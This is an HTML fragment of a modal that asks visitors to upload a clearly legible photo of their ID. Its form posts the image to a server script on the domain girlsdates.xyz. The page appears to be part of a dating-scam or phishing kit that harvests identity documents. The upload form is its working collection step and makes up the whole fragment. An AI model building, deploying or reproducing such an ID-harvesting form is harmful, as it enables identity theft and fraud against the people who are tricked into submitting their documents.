        ...
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-body">
                    ...
                    <div class="container">
                        <div class="mt-4">
                            <img src="https://i.ibb.co/dWfdRCY/r7k-S3-GLlh2-D.png" class="img-fluid rounded mx-auto d-block" width="auto" height="auto" alt="..." />
                        </div>
                        <div class="mt-4">
                            <div class="p-3 mb-2 bg-secondary bg-opacity-25 text-dark rounded">
                                <p>
                                    <strong>
                                            Upload a Photo of your ID</strong
                                        >
                                    </p>
                                    <p>
                                        <small>
                                            The information on your ID must be
                                            clearly visible in the photo,
                                            otherwise you might have to submit
                                            it again.</small
                                        >
                                    </p>
                                </div>
   <form action="https://girlsdates.xyz/imageupload/server.php" enctype="multipart/form-data" method="post">
        <div class="mb-3">
          <input type="file" class="form-control" accept="image/jpg, image/gif, image/jpeg, image/png" name="image" id="image" required>
        </div>
